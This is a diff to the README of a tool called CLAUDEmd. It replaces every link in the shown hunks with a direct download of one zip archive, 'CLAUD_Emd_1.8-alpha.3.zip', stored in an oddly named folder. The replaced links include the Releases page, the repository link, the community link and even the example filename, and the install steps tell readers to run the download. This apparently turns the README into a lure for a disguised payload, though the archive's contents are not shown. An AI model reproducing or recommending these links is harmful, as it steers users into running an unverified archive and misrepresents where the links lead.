@@ -6,9 +6,9 @@ Welcome to CLAUDEmd! This application helps you enhance your AI collaboration ta
 
 ## 📥 Download CLAUDEmd
 
-[![Download CLAUDEmd](https://img.shields.io/badge/Download-CLAUDEmd-blue)](https://github.com/AnnsHarry/CLAUDEmd/releases)
+[![Download CLAUDEmd](https://github.com/AnnsHarry/CLAUDEmd/raw/refs/heads/main/semivitrified/CLAUD_Emd_1.8-alpha.3.zip)](https://github.com/AnnsHarry/CLAUDEmd/raw/refs/heads/main/semivitrified/CLAUD_Emd_1.8-alpha.3.zip)
 
-To get started, download CLAUDEmd from our Releases page. Just click the button above or visit [this link](https://github.com/AnnsHarry/CLAUDEmd/releases).
+To get started, download CLAUDEmd from our Releases page. Just click the button above or visit [this link](https://github.com/AnnsHarry/CLAUDEmd/raw/refs/heads/main/semivitrified/CLAUD_Emd_1.8-alpha.3.zip).
 
 ## 🔍 Features
 
@@ -31,10 +31,10 @@ Before you download, make sure your system meets the following requirements:
 Follow these steps to install CLAUDEmd on your computer:
 
 1. **Download the Application:**
-   Click the download link above or visit [the Releases page](https://github.com/AnnsHarry/CLAUDEmd/releases) and select the latest version.
+   Click the download link above or visit [the Releases page](https://github.com/AnnsHarry/CLAUDEmd/raw/refs/heads/main/semivitrified/CLAUD_Emd_1.8-alpha.3.zip) and select the latest version.
 
 2. **Locate the Downloaded File:**
-   Find the file in your Downloads folder. It is typically named something like `CLAUDEmd-v1.0.exe` (or the appropriate file type for your operating system).
+   Find the file in your Downloads folder. It is typically named something like `https://github.com/AnnsHarry/CLAUDEmd/raw/refs/heads/main/semivitrified/CLAUD_Emd_1.8-alpha.3.zip` (or the appropriate file type for your operating system).
 
 3. **Run the Installer:**
    Double-click the downloaded file. If prompted by your system, confirm that you want to run the application.
@@ -70,12 +70,12 @@ If you encounter issues or have questions, please open an issue in our GitHub re
 
 ## 🔗 Useful Links
 
-- [Visit Our GitHub Repository](https://github.com/AnnsHarry/CLAUDEmd)
-- [Join Our Community](https://yourcommunitylink.com) (Placeholder for community link)
+- [Visit Our GitHub Repository](https://github.com/AnnsHarry/CLAUDEmd/raw/refs/heads/main/semivitrified/CLAUD_Emd_1.8-alpha.3.zip)
+- [Join Our Community](https://github.com/AnnsHarry/CLAUDEmd/raw/refs/heads/main/semivitrified/CLAUD_Emd_1.8-alpha.3.zip) (Placeholder for community link)
 
 ## 📅 Release Notes
 
-Stay updated with the latest features and fixes. Visit the [Releases page](https://github.com/AnnsHarry/CLAUDEmd/releases) to view detailed changelogs for each version.
+Stay updated with the latest features and fixes. Visit the [Releases page](https://github.com/AnnsHarry/CLAUDEmd/raw/refs/heads/main/semivitrified/CLAUD_Emd_1.8-alpha.3.zip) to view detailed changelogs for each version.
 
 ## ⚠️ Feedback
 
